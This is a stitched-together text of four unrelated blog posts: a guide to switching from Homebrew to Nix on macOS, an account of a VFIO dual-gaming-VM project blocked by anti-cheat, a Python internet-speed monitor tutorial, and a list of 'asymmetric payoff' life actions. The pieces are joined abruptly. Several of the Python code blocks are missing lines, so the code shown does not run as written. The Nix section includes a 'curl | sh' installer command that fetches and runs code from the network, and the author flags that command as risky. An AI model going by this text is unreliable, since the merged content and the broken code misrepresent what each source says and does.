<p>The short answer: hype.</p>
<p>The long answer: I’ve been frustrated with Homebrew’s user experience for years now, and
used this opportunity to start afresh. The default non-Homebrew answer is the venerable
<a href="https://www.macports.org/">MacPorts</a>, which has been around for quite a while. Most people who aren’t
functional programming or build system nerds should probably use MacPorts, as it has been
around long enough to have good support documentation floating around the internet.
Unfortunately I’m a sucker for hermetic builds <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, so I decided to try
Nix.</p>
<p>In addition, Nix has one cool feature I haven’t seen anywhere else: temporarily installing
packages using <code>nix-shell</code>. For example, I can install <code>ripgrep</code> inside a temporary shell,
and the package is automatically cleaned up when I’m done:</p>
<p>There’s a lot of cool stuff <code>nix-shell</code> can do, check out some more examples
<a href="https://ghedam.at/15978/an-introduction-to-nix-shell">here</a>.</p>
<h4 id="why-not-homebrew">Why not Homebrew?</h4>
<p>If Homebrew works for you, then by all means keep using Homebrew! However, I’ve grown
frustrated with it. Homebrew has spent a lot of effort making a software delivery system
work across many iterations of OSX/MacOS, and countless developers have installed <code>brew</code>
as one of the first things on a new Mac. It is with this acknowledgement of the work the
Homebrew developers have put into the software and its resulting success that I offer
these criticisms:</p>
<ol>
<li>
<p>Unpredictable command times. I never know if running <code>brew install</code> or <code>brew upgrade</code>
is going to take 5 seconds or 20 minutes. This usually means knowing if a program or
dependency is being downloaded as a prebuilt binary or compiled on the spot. It would
be nice to signal to the user if compilation is about to happen, so they can plan the
install accordingly.</p>
</li>
<li>
<p>Very slow <code>brew update</code> times. Homebrew’s core package database is a
<a href="https://github.com/Homebrew/homebrew-core">git repository</a>, which is great for enabling collaboration. Nix uses
the <a href="https://github.com/NixOS/nixpkgs">same model</a>, but the difference lies in how the clients get the package
database: <code>brew update</code> does a <code>git pull</code> under the hood, while <code>nix-channel --update</code>
downloads a compressed tarball each time the channel is updated. This means Homebrew
updates can rely on git and GitHub itself as an efficient distribution mechanism,
getting delta updates “for free” without setting up extra infrastructure. However,
this design choice means that the client has to maintain its own git repo –
<a href="https://github.com/Homebrew/brew/issues/4755#issuecomment-416572560"><code>git gc</code> can strike at any time</a>, for example, and slow things down
tremendously. It is also a nightmare for <a href="https://discourse.brew.sh/t/best-practice-for-homebrew-on-travis-brew-update-is-5min-to-build-time/5215">CI</a>, where the lack of
an updated Homebrew git cache can negatively impact build times. Meanwhile,
<code>nix-channel --update</code> runs are very predictable, even if a bit inefficient – you’re
downloading a 16Mb tarball when the channel is updated, but that’s it.</p>
</li>
<li>
<p>Bad interactions when packages are upgraded. I’m not sure exactly why this happens, but
occasionally when certain packages are upgraded (such as <code>python</code> from 3.7 to 3.8),
<a href="https://discourse.brew.sh/t/homebrew-updating-major-python-version-breaks-a-lot-of-things-on-my-system/8545">related packages can break</a>. Because Nix builds are hermetic,
packages should all “work together” regardless of how the system was previously set
up.</p>
</li>
</ol>
<h4 id="why-not-macports">Why not MacPorts?</h4>
<p>To be honest, MacPorts is probably just fine for your needs. I haven’t used it in forever,
but my understanding is that it’s reliable and has plenty of built-up community knowledge
on how to fix things. Take a look at it and see if it fits your needs! I also quickly
found <a href="https://saagarjha.com/blog/2019/04/26/thoughts-on-macos-package-managers/">this post</a> which details some differences between it and
Homebrew. But hey, if you like adventure, give Nix a shot!</p>
<h4 id="why-not-nix">Why not Nix?</h4>
<p>I felt it was honest to include a section like this.</p>

<li>
<p>I haven’t done a deep evaluation, but my impression is that Nix is the least documented
and least mature of the bunch. Expect to do a bit more digging to solve issues, but
once you get started it generally just works.</p>
</li>
<li>
<p>Workarounds are currently needed for Catalina and above, especially if you have an
older Mac without a T2 chip.</p>
</li>
<li>
<p>You’ll need to understand a bit of the <a href="https://nixos.wiki/wiki/Nix_Expression_Language">Nix Expression Language</a>. It’s
not as scary as it sounds, but you will have to edit a <code>.nix</code> file to install a
package (there is no CLI equivalent to <code>brew install</code> that I am aware of).</p>
</li>
</ol>
<h3 id="installing-nix">Installing Nix</h3>
<p>Installing Nix requires two phases: installing Nix itself, and then installing
<a href="https://github.com/LnL7/nix-darwin">nix-darwin</a>. The installation methods I know of involve <code>curl</code>ing with an
eventual <code>sudo</code> call inside the script<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. You will have to do something extra if
you’re running Catalina<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> or above.</p>
<ol>
<li>
<p>Install Nix:</p>
<ul>
<li>Pre-Catalina: <code>curl https://nixos.org/nix/install | sh</code> (I haven’t tested this).</li>
<li>Catalina with a T2 chip: <code>sh &lt;(curl -L https://nixos.org/nix/install) --darwin-use-unencrypted-nix-store-volume</code>
(according to the site, “unecrypted” is a misnomer as the chip will encrypt it
anyway).</li>
<li>Catalina without a T2 chip: follow <a href="https://www.philipp.haussleiter.de/2020/04/fixing-nix-setup-on-macos-catalina/">these instructions</a>
<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>.</li>
</ul>
<p>Make sure that <code>nix-build</code> is now in your <code>PATH</code>. You may have to source
<code>$HOME/.nix-profile/etc/profile.d/nix.sh</code> in your shell’s <code>rc</code> file to get this to
work.</p>
</li>
<li>
<p>Install <code>nix-darwin</code>:</p>
<div><pre><code data-lang="sh">nix-build https://github.com/LnL7/nix-darwin/archive/master.tar.gz -A installer ./result/bin/darwin-installer
</code></pre></div><p>You should now have <code>darwin-rebuild</code> in your <code>PATH</code>.</p>
</li>
</ol>
<h3 id="using-nix">Using Nix</h3>
<p>The basic workflow for using Nix is editing <code>~/.nixpkgs/darwin-configuration.nix</code> and then
running <code>darwin-rebuild switch</code> to activate those changes.</p>
<h4 id="editing-darwin-configurationnix">Editing <code>darwin-configuration.nix</code></h4>
<p>Open up <code>~/.nixpkgs/darwin-configuration.nix</code> with your favorite editor. Look at
<code>environment.systemPackages</code>: this is the list of packages you’ll want to install.
<a href="https://nixos.org/guides/nix-pills/basics-of-language.html#idm140737320584496">Nix lists</a> are space-delimited (not comma-delimited). The packages listed
there come from the Nixpkgs channel you’re subscribed to. You can list what packages are
available by running <code>nix-env -qaP</code> or searching <a href="https://search.nixos.org/packages">Nixpkgs</a> online. All the
packages are prepended with <code>pkgs.</code>; I used Nix’s <code>with pkgs;</code> clause to prepend that by
default:</p>
<div><pre><code data-lang="nix">  environment<span>.</span>systemPackages <span>=</span> <span>with</span> pkgs; [
      gitAndTools<span>.</span>gitFull
      byobu
      wget
    ];
</code></pre></div><h4 id="activating-your-changes">Activating your changes</h4>
<p>Once you’re done editing, run <code>darwin-rebuild switch</code> to install your new packages! If you
made an error, <code>darwin-rebuild</code> will let you know and your current environment will not be
affected.</p>
<h4 id="updating-the-package-database">Updating the package database</h4>
<p>If you want to update the package database, you can run</p>
<h4 id="advanced-usage">Advanced usage</h4>
<p>Nix will detect conflicts and error out, such as when two packages install the same
binary. This can happen when <code>python37</code> and <code>python38</code>, for example, both want to create a
binary called <code>pydoc3</code>. To resolve this, you can call <code>lowPrio</code> to declare a package low
priority and have the other package win.</p>
<div><pre><code data-lang="nix">  environment<span>.</span>systemPackages <span>=</span> <span>with</span> pkgs; [
      python37
      (lowPrio python38)
    ];
</code></pre></div><p>(As a side note: once you’ve installed both, look at how quickly you can uninstall and
reinstall each package. It takes between 1 and 2 seconds to uninstall or reinstall
python3.7, which in my opinion is ridiculously fast.)</p>
<h3 id="further-reading">Further reading</h3>
<p>I have to admit that I only have a shallow knowledge of Nix, and the information above
has made it sufficient as a daily replacement for Homebrew. However, there is a rich
ecosystem around Nix that you may want to explore further. Here are a few links to learn
more:</p>

<p>From the <a href="https://landing.google.com/sre/sre-book/chapters/release-engineering/">Google SRE book</a>: a build that is “insensitive to
the libraries and other software installed on the build machine.” This greatly
increases reliability, because it means that whatever you have installed on your
computer is less likely to affect the build process and the resulting program. This is
similar to <a href="https://www.docker.com/">Dockerizing</a> an application, but less extreme and less
resource-intensive to run. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>

<p>This is just as risky as the classic <a href="https://stackoverflow.com/questions/29382739/why-using-curl-sudo-sh-is-not-advised"><code>curl | sudo sh</code></a>.
Unfortunately I can’t find another way to easily install Nix, so I guess you can
download <a href="https://nixos.org/nix/install">https://nixos.org/nix/install</a> and <a href="https://nixos.org/guides/nix-pills/install-on-your-running-system.html#idm140737320801568">compare its signature</a> before
running it. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>

<li id="fn:3" role="doc-endnote">
<p>Catalina gets a lot of shade for its read-only root filesystem and signed
binaries, but I think it’s a step forward for general purpose computing. What I object
to is that signed binaries must be signed with registered Apple developer accounts,
which cost money. It would be nice if that was a bit distributed, so anyone could sign
and Apple maintained a reputation database or something. I’m annoyed at Apple for
mixing good security and OS maintenance practices with total, walled-garden lockdown.
Admittedly, the web has a lot of the <a href="https://xkcd.com/1367/">same security benefits</a>, but we’re not at a
point yet where web apps can compete with native applications. Hopefully we’ll get
there one day. <a href="#fnref:3" role="doc-backlink">↩︎</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>With the current shortages on all computer parts world wide, the release of the next Nvidia series, and my personal decision to live at home until the end of the pandemic, I got the idea that maybe it was time to upgrade my computer.</p>
<p>My whole family is into gaming - well, my brother, dad and me that is. All the computers are in the same room, which makes for some interesting voice calls when the background noise includes <a href="https://store.steampowered.com/app/945360/Among_Us/">desperate attempts to plead innocent of murder</a> and <a href="https://store.steampowered.com/app/581320/Insurgency_Sandstorm/">attempting to coordinate a terrorist insurgency</a>. Beyond the noise, one of the big issues with this is the power usage and heat generated from the 3 gaming computers, and occasionally the file server is on too, which contains ~2tb of our Steam games (more on that in another blog post).</p>
<p>I have been following the story of <a href="https://www.reddit.com/r/VFIO">VFIO</a> passthrough for a while, and a few of my friends have been successfully gaming on a Windows VM on top of Linux since last year. I had bigger ideas though - what if I could run two gaming VMs on one PC?</p>
<p>Spoilers: This did not go well for reasons completely out of my control, which I will explain later in the article. I’m writing this blog post because it was a fun project and I spent a lot of weekends trying to get it to work for the games I wanted to play, and maybe it will help someone else.</p>
<h2 id="why">Why?</h2>
<p>
<a href="https://m1cr0man.com/posts/sharing-gaming-pc/images/computer.jpg"><img src="https://m1cr0man.com/posts/sharing-gaming-pc/images/computer_hufa4a6146b9cfde28a01e6972453f1dc6_604301_0x384_resize_q85_gaussian.jpg" title="My computer in all its UV glory"></a>


Initially, my main motives were the power and cost savings, but I quickly realized that I wasn’t going to save that much power or money (my brother would though!) if I included the GPU upgrades I wanted and how much power they consumed. However as I got into it there were some other major benefits.</p>
<p>Firstly, if Windows is installed in a VM there is no real need to do a system reload even if the underlying hardware changes. As anyone who has <a href="https://www.sinitargaming.com/nv.html">modded a Bethesda game</a> will know, reinstalling some games can take days especially if you have a poor internet connection. Since I was setting up two identical VMs, this also meant I only needed to do one system install and then I could clone the filesystem to the other.</p>
<p>Speaking of the filesystem, I’m a huge fan of ZFS. There are some magic-tier benefits of using this as the backing store for the VMs. I initially built the VMs with 60gb disks on a 256gb SSD. You would expect the total storage usage of two Windows installs to be around 40gb or so, but since I was able to clone one install from the other, and I had compression enabled, the total space used to install both OSes came to under 15gb! With deduplication enabled, I was also able to save huge amounts of space between games installed on both VMs. I estimated that both VMs would end up with at least 150gb usable space on the 250gb SSD, including the space used for the Linux install.</p>
<p>With all this in mind, I was also going to compact our file server into this PC too. The Linux side of this host can be used for more than just running VMs. If I was to buy two 14tb HDDs I could migrate all of our server files onto it and I would be combining <em>three</em> computers into one.</p>
<p>Despite all these benefits, I wasn’t going to give up anything to move to a VM. If I couldn’t get two screens and my sound card working, I was going to bail on the project. It would also be especially difficult to convince my brother to give up his PC if he had to make compromises too!</p>
<h2 id="how">How?</h2>
<p>
<a href="https://m1cr0man.com/posts/sharing-gaming-pc/images/zfs.png"><img src="https://m1cr0man.com/posts/sharing-gaming-pc/images/zfs_hud78be23e827bb3cf72d2a2d8198aa976_66343_0x384_resize_q85_gaussian_2.png" title="ZFS storage usage is very low"></a>


I had to buy a few things to even get started on this project. The 256gb SSD was one - so that I didn’t have to wipe the currently working Windows install I had. Next was buying a sufficient amount of RAM for 2 gamers and a Linux server to run all at once on my PC. I got 32gb to start with, but my motherboard has another 4 slots and I planned to go to 64gb if all went well. Lastly, I wanted more CPU threads. My chipset, the LGA2011-1, once was available with a mammoth 16 thread CPU - the <a href="https://ark.intel.com/content/www/us/en/ark/products/64596/intel-xeon-processor-e5-2690-20m-cache-2-90-ghz-8-00-gt-s-intel-qpi.html">Xeon E5-2690</a>. I managed to grab one of these off Ebay for much, much less than its original price tag.</p>
<p>Another thing about my chipset is that it has 40 PCIE 3.0 lanes. This means that I can run two graphics cards at full speed plus install PCIE sound cards and still have lanes left over. Unless you go for an LGA2066 or an AMD Threadripper, you’re only looking at 20 or 16 lanes on any newer CPU which is lame. 60 euro for 40 lanes and 16 threads will certainly keep me happy!</p>
<p>In terms of the software install, I was of course going to use <a href="https://nixos.org/">NixOS</a>, which is now my go-to distribution for all things server related. Nothing beats declarative configuration management built into your OS, and this helped a lot throughout this process as I was able to go back and forth on VM configurations and not lose the working setups. If you’re reading this looking for some config examples, my entire QEMU command lines are <a href="https://github.com/m1cr0man/nix-configs/blob/a7257a8aea3ef885de0c45a006ef32c7181bac21/services/gamingvms.nix">in my nix-configs repo</a> as well as the rest of the system setup.</p>
<p>This would also be the first time I would use Windows 10 for my own system. I am on Windows 7 right now, for a number of reasons. One being my modded games install that I mentioned above, but also there’s a lot of features in Windows 10 that I just don’t like one bit. That said, Windows 7 is receiving less and less support from games and other applications so it was time to finally move on with this new setup.</p>
<h2 id="nothing-is-ever-easy">Nothing is ever easy</h2>
<p>I started off getting one VM working (the one which would be my own gaming VM in the end), and getting Windows installed and operational through my Nvidia graphics card was actually quite easy. The Arch Wiki guide on VFIO and <a href="https://www.reddit.com/r/VFIO">the subreddit</a> had all the resources I needed to get this running. Although, this success was short lived when I discovered my sound card wasn’t working.</p>
<p>A while ago I picked up a Creative X-Fi Titanium from Ebay. I play Battlefield 2142 and some other older games a lot and they use the EAX sound system and have some unique sound settings for X-Fi cards that makes the sound amazing. Naturally, I installed the Creative sound card driver when setting up the VM, which immediately caused it to freeze for 2 minutes, and thereafter play no sound at all.</p>
<p>It took me 2 weekends and a <a href="https://www.reddit.com/r/VFIO/comments/ixnmb2/problems_passing_through_sound_card_on_windows/">desperate Reddit post</a> to find a solution to this. I tried strace-ing the VM to see what syscalls were being used during the freeze, I messed around with the PCI device config on the Linux side to see what I could do. Eventually I discovered that the sound card worked just fine in a Linux VM, and it worked fine up until I installed the Creative driver, but after that it would take a full system reboot to get it working again which really tripped me up. Debugging on the Windows side proved too difficult for me as <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/wpp-software-tracing">it looked like</a> I was going to need a second Windows machine running Visual Studio to get anything done. I settled on using the Windows default sound card driver which did get me 24 bit audio but did not get me EAX. This was the sort of compromise I was hoping I wouldn’t need to make with the VM, but I was hopeful it would still pay off beyond this.</p>
<p>Once I had one VM running I cloned the Nix config and cloned the ZFS volume, and I had the second running in a matter of minutes. There were no problems running the second VM through the motherboard’s sound card. Installing Steam, Discord, a web browser and some games also went smoothly.</p>
<p>On the third weekend of this project, I was finally able to sit down and install Rainbow Six Seige for some actual gaming. I gathered my usual squad and we got so far as getting into a match.</p>
<p>Then I got kicked.</p>
<h2 id="this-means-war">This Means War</h2>
<p>
<a href="https://m1cr0man.com/posts/sharing-gaming-pc/images/kickmessage.png"><img src="https://m1cr0man.com/posts/sharing-gaming-pc/images/kickmessage_hu6e0eac926f369eee503f25a88442f2a1_452269_0x384_resize_q85_gaussian_2.png" title="It is over Lucas, BattlEye has the high ground"></a>


It didn’t take me long to discover <a href="https://www.youtube.com/watch?v=vXkuyeYaTro">a Youtube video</a> and <a href="https://www.reddit.com/r/VFIO/comments/hsv8iz/battleye_just_ban_kvm_users_on_escape_from_tarkov/fydaa8y/">a Reddit post</a> explaining that BattlEye has explicitly blacklisted VMs from playing online games. This anti-cheat is used by Rainbow Six and many other games I was looking forward to playing, and searching around I found that most other anti cheats had a similar system in place. I was able to find instruction on bypassing these checks but it involved doing stuff like patching the kernel and editing hardware IDs for devices, which I was not keen to do. Not only would this be difficult to do and hard to maintain, the anti cheats could simply <a href="https://www.reddit.com/r/VFIO/comments/i1aqrz/regarding_the_vm_spoofing/">update their checks</a> at any time and start looking at something new, bringing me back to square one.</p>
<p>I want to believe that there is another solution here. The problem at its core is that the anti cheats cannot check for tampering on the hypervisor side, nor do they have the business case to implement such a system. I think if VM gaming is ever to become a viable option, the VFIO community or similar would need to offer up something to them which would validate their system as not being tampered with. I’m not even sure how this would work - a verifiable memory lock of sorts? Binary signing? It really depends on what they want - baring in mind that the concept of client-side anti cheat is pretty flawed anyway. Hell, I would even buy a “VM License” from BattlEye if such a thing existed just to make this setup work, and I can imagine the decision makers would be happy to provide such a thing if it meant more money for them.</p>
<p>Although BattlEye has claimed that up to 90% of VM gamers were cheating, that’s not to say that 90% of all cheaters use VMs. It’s way too cumbersome and from what I saw in my dark search into the bypass methods, most people just crack the binary on Windows or do some weird driver magic and then get on with memory modifications. It’s ridiculous that these systems are dictating how I play the games I paid for, making assumptions about my system and deciding that it will be worth the bad PR and small user base impact.</p>
<h2 id="mothballed-for-now">Mothballed, for now</h2>
<p>With no way to play modern titles in a VM reliably, without being wrongly accused as a cheater by unfeeling software and its business logic, I had to drop the project. If my brother and I were playing less high budget games maybe it would be viable, as it’s only games with these anti cheats that are actually an issue. That said, almost every game without weird anti cheat works on Wine now, which has opened the door to a new project that I am now half way through and will blog in the near future (read: Not 2 years again).</p>

<p><img data-src="https://i.ibb.co/TgcDyYk/carbon-7-2.png" alt="Monitor your internet with python" title="Monitor your internet with python" src="https://i.ibb.co/TgcDyYk/carbon-7-2.png">
</p><p>
I live in Germany and Germany is known for its diversity. The people are diverse, the culture is diverse and the quality of internet connections are equally as diverse.</p><p>
Having spoken to my internet provider who insisted I had no problems with my internet connection I decided to write a program to monitor my upload and download speed.</p>
<h2 id="getting-started">Getting started</h2>

<p>
We will be using two cool packages in python namely <code>speedtest</code> and <code>matplotlib</code>. <code>speedtest</code> will provide us with the information about our internet connection and <code>matplotlib</code> will allow us to generate graphs based on this information.</p><p>
Whether youâ€™re in a <a href="https://docs.python.org/3/tutorial/venv.html">virtual environment</a> or not using one you will have to install speedtest and matplotlib.</p>
<div><div><pre><code>pip <span>install </span>matplotlib
pip <span>install </span>speedtest-cli
</code></pre></div></div><p>
We will also be using a few built in python packages <code>datetime</code> and <code>csv</code>. CSV (or comma-separated values) are a quick way of storing data. We will be using this to store the information about our internet speeds and then using matplotlib to make this information visual.</p>
<h2 id="gathering-data">Gathering data</h2><p>
Create a python file called <code>monitor.py</code></p>
<p>
and letâ€™s put the following code on the inside</p>
<div><div><pre><code><span>import</span> <span>speedtest</span>
<span>s</span> <span>=</span> <span>speedtest</span><span>.</span><span>Speedtest</span><span>()</span>
<span>while</span> <span>True</span><span>:</span>
    <span>print</span><span>(</span><span>s</span><span>.</span><span>download</span><span>(),</span> <span>s</span><span>.</span><span>upload</span><span>())</span>
</code></pre></div></div><p>
and we should be greeted by the following output before hitting <code>ctrl + C</code> to get out of this infinite loop.</p>
<div><div><pre><code>75020309.22943133 24381170.373616524
105192450.00822952 40653433.153288215
</code></pre></div></div><p>
So by creating a new instance of <code>speedtest</code> as <code>s</code> and testing the upload and download speed we are given the upload and download speed in bits per second. To convert this to megabits per second <code>(Mb/s)</code> we can do the following to include the time of the test too:</p>
<div><div><pre><code><span>import</span> <span>speedtest</span>
<span>import</span> <span>datetime</span>
<span>import</span> <span>time</span>
<span>s</span> <span>=</span> <span>speedtest</span><span>.</span><span>Speedtest</span><span>()</span>

<span>while</span> <span>True</span><span>:</span>
    <span>time_now</span> <span>=</span> <span>datetime</span><span>.</span><span>datetime</span><span>.</span><span>now</span><span>().</span><span>strftime</span><span>(</span><span>"%H:%M:%S"</span><span>)</span>

<p><strong>Note:</strong> Added a delay due to <a href="https://www.reddit.com/r/Python/comments/jhh8oa/monitor_your_internet_with_python/">feedback</a> received by <a href="https://www.reddit.com/user/squidwardtentickles/">an awesome Reddit user.</a></p><p>
which yields to:</p>
<div><div><pre><code><span>time</span>: 12:44:15, downspeed: 95.04 Mb/s, upspeed: 32.85 Mb/s
<span>time</span>: 12:44:35, downspeed: 99.46 Mb/s, upspeed: 38.76 Mb/s
<span>time</span>: 12:44:56, downspeed: 100.59 Mb/s, upspeed: 38.94 Mb/s
</code></pre></div></div><p>
Now we will move on to recording this in a CSV file. CSVs are large text files which values separated by commas. Here is an example of one of mine:</p>
<pre><code>time,downspeed,upspeed
12:17:01,100.05,38.28
12:17:21,100.53,37.85
12:17:42,74.87,25.92
</code></pre><p>
We start with a header row then have the information split up. We can think about this like an excel sheet:</p>
<p><a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ekJiEGPQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/upoqadpj8vh4se02u4om.png"><img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ekJiEGPQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/upoqadpj8vh4se02u4om.png" alt="a table with the same information as the code block above"></a></p><p>
In order to record into a csv file in python we need to import the CSV package and â€˜openâ€™ a CSV file (if one doesnâ€™t exist it will create one).</p>
<div><div><pre><code><span>import</span> <span>speedtest</span>

</code></pre></div></div><p>
So while you let this code run for 4-5 minutes we can discuss what is going on. Line 7 <code>with open</code> essentiallly creates a csv file with the name <code>test.csv</code> with the headers <code>name</code>, <code>downspeed</code> and <code>upspeed</code> and writes them into the csv. Then the loop begins and every time a test is performed by speedtest it writes a new row into the csv with the time, download speed and upload speed we specified before. So letâ€™s go and look at that now.</p>
<pre><code>time,downspeed,upspeed
12:51:16,99.29,38.66
12:51:37,100.67,38.79
12:51:57,99.7,38.79
12:52:17,92.89,31.99
12:52:38,99.4,38.96
</code></pre><p>
Cool now we are gathering information and storing it in a csv. You could do all sorts of clever stuff with the filename like name it todayâ€™s date using <code>datetime</code> but for now I will keep it as test.</p><p>
You could also set up a check to see if a certain amount of time has passed and to stop the application after that but I will leave that up to your own creativity.</p>
<h2 id="visualising-the-data">Visualising the data</h2><p>
Letâ€™s make another python file to generate the graph of our internet connection. This is where we will use matplotlib.</p>

<div><div><pre><code><span>import</span> <span>matplotlib.pyplot</span> <span>as</span> <span>plt</span>
<span>import</span> <span>csv</span>
<span>import</span> <span>matplotlib.ticker</span> <span>as</span> <span>ticker</span>

</code></pre></div></div>

<p>
The easiest way to generate a graph is by using an array. In order to populate our arrays we will have to iterate through our new csv file</p>
<div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>'test.csv'</span><span>,</span> <span>'r'</span><span>)</span> <span>as</span> <span>csvfile</span><span>:</span>

    <span>next</span><span>(</span><span>csvfile</span><span>)</span>
    <span>for</span> <span>row</span> <span>in</span> <span>plots</span><span>:</span>
        <span>times</span><span>.</span><span>append</span><span>(</span><span>str</span><span>(</span><span>row</span><span>[</span><span>0</span><span>]))</span>
        <span>download</span><span>.</span><span>append</span><span>(</span><span>float</span><span>(</span><span>row</span><span>[</span><span>1</span><span>]))</span>
        <span>upload</span><span>.</span><span>append</span><span>(</span><span>float</span><span>(</span><span>row</span><span>[</span><span>2</span><span>]))</span>

<span>print</span><span>(</span><span>times</span><span>,</span> <span>"</span><span>\n</span><span>"</span><span>,</span> <span>download</span><span>,</span> <span>"</span><span>\n</span><span>"</span><span>,</span> <span>upload</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code><span>[</span><span>'12:51:16'</span>, <span>'12:51:37'</span>, <span>'12:51:57'</span>, <span>'12:52:17'</span>, <span>'12:52:38'</span><span>]</span>
    <span>[</span>99.29, 100.67, 99.7, 92.89, 99.4]
    <span>[</span>38.66, 38.79, 38.79, 31.99, 38.96]
</code></pre></div></div><p>
So now we are parsing our data! The <code>next(csvfile)</code> essentially skips the row of headers (that were for our benefit only, not pythonâ€™s). Now we come on to using <code>matplotlib</code> which I am by no standards an expert on. <a href="https://matplotlib.org/">Their documentation</a> is <em>extensive</em>.</p>
<div><div><pre><code><span>plt</span><span>.</span><span>figure</span><span>(</span><span>30</span><span>,</span> <span>30</span><span>)</span>
<span>plt</span><span>.</span><span>plot</span><span>(</span><span>times</span><span>,</span> <span>download</span><span>,</span> <span>label</span><span>=</span><span>'download'</span><span>,</span> <span>color</span><span>=</span><span>'r'</span><span>)</span>
<span>plt</span><span>.</span><span>plot</span><span>(</span><span>times</span><span>,</span> <span>upload</span><span>,</span> <span>label</span><span>=</span><span>'upload'</span><span>,</span> <span>color</span><span>=</span><span>'b'</span><span>)</span>
<span>plt</span><span>.</span><span>xlabel</span><span>(</span><span>'time'</span><span>)</span>
<span>plt</span><span>.</span><span>ylabel</span><span>(</span><span>'speed in Mb/s'</span><span>)</span>
<span>plt</span><span>.</span><span>title</span><span>(</span><span>"internet speed"</span><span>)</span>
<span>plt</span><span>.</span><span>legend</span><span>()</span>
<span>plt</span><span>.</span><span>savefig</span><span>(</span><span>'test_graph.jpg'</span><span>,</span> <span>bbox_inches</span><span>=</span><span>'tight'</span><span>)</span>
</code></pre></div></div><p>
This code tells matplotlib or <code>plt</code> object to create a figure with the lines labelled â€˜downloadâ€™ and â€˜uploadâ€™ to be plotted against their respective arrays. So for every item in the download and time array, a mark will be made on the graph against it. Finally the x and y-axis get labels and the graph gets saved.</p>

This is a short form of a project I recently finished which contains automated uploads to a cloud platform, schedules itself daily does some annotations of the lowest download speed. I initially made it to complain to my internet provider however I know that it will be like showing a graph to a brick wall.</p>

  <p><em><a href="#the-list">Click here</a> to skip to the list.</em></p>

<p>Something has an <strong>asymmetric payoff</strong> if you stand to gain a lot more than you stand to lose. Stock options, for example, have an asymmetric payoff curve.</p>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBMQT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--f24232febb5dbe4fbead2fcfa0470cc71442f093/image-1601846340990.gif" alt="file"></p>

<p>Payoff chart for a long call option</p>

<p>In the chart above, the dotted blue line represents the payoff for a stock. It's linear because a $1 increase in share price means a $1 increase for the stockholder, and a $1 decrease in share price means a $1 decrease for the stockholder.</p>

<p>But the red line—representing the payoff function for a call option on this stock—is <em>not</em> linear. Above $100 (the strike price) the payoff function mirrors that of the underlying stock, but <em>below</em> $100 there's no more loss.</p>

<p>In other words: <strong>you get all the upside but none of the downside.</strong></p>

<p>Unfortunately the market for options is pretty efficient, which means this positive convexity is priced into the option premium. But real-life actions <em>also</em> have payoff curves, and ideally these would also have positive, asymmetric payoffs.</p>

<p>Real-life actions tend to be less-efficiently priced, because</p>

<ul>
<li>Nobody knows your circumstances better than you do</li>
<li>Humans have all sorts of quirks and biases</li>
<li>Personal decisions are <em>rarely</em> zero sum, but financial markets <em>are</em>
</li>
</ul>

<p>I've compiled a non-exhaustive list of actions with (positive) convex payoffs below. <a href="mailto:tjcx@tjcx.me">Let me know</a> if I missed any!</p>

<h2>Interpersonal</h2>

<h3>Giving gifts</h3>

<p>Twice in <em>Shoe Dog</em>, Phil Knight sends unsolicited gifts to people's homes. First, he sends legendary track coach Bill Bowerman a pair of Tiger shoes, which ultimately induces Bowerman to join (what will become) Nike, providing Knight with a powerful business partner.</p>

<p>Then, after visiting his supplier in Japan, he sends a money order to one of the supplier's employees "for a new bike" to replace the one he lost in WWII. Later, this employee provides Knight with valuable inside information about his employer.</p>

<p>The point is that giving a gift has a small fixed cost (like an option) but the possibility of providing very large returns.</p>

<h3>Asking for big things</h3>

<p>Asking for stuff has a limited cost (getting rejected) but unlimited gain (getting anything you ask for). The bigger the ask, the better your expected value! Try asking for</p>

<h4>Promotions</h4>

<p>The downside of asking for promotions is that you annoy your boss. The possible upsides are</p>

<ol>
<li>You get it immediately</li>
<li>You plant the idea in your boss's head</li>
<li>You make it seem reasonable that you should be promoted soon</li>
<li>You learn what needs to happen in order to get promoted</li>
</ol>

<p>So just ask.</p>

<h4>Raises</h4>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBMUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--b2e3e11a7a1acbc649014515a168e5e2305debf9/image-1601846423636.gif" alt="Raise"></p>

<p>See above. As with investing/interest, small percentage increases in your salary will compound over time, so ask for raises often. (Or <a href="#switching-companies">switch companies</a> to get one.)</p>

<h4>Investments (in your business)</h4>

<p>There's currently a dearth of good startups and a deluge of investor money, so you'd probably be surprised how many people would be willing to invest in your new venture.</p>

<p>But even in less favorable conditions it can never hurt to ask. People with lots of money are always looking for</p>

<ol>
<li>Good returns</li>
<li>Something interesting to do</li>
<li>Insider status</li>
</ol>

<p>All of which make them eager to invest. And receiving investment can have huge returns, allowing you to scale your business.</p>

<h4>More business (from customers)</h4>

<p>Okay sure, asking a prospect "Hey there want to buy my product?" isn't exactly a nuanced approach to sales. But "asking" in this context could also mean running ads, telling friends, cold emailing people, etc. The upsides here are</p>

<ol>
<li>You get more customers</li>
<li>You learn why nobody wants to buy your thing</li>
</ol>

<p>Both of which are immensely valuable. Whereas the "asking" part has virtually zero downside.</p>

<h4>Sabbaticals</h4>

<p>Obviously it depends on where you work, but in some industries and role the "sabbatical" (i.e. long vacation) is relatively common. It's expensive to hire your replacement, so if you're burnt out or considering switching companies, tell your employer you need a break. The worst that happens is they say "no"! And the best case scenario is you get to take a massive paid vacation.</p>

<h4>Partnerships (with other people/businesses)</h4>

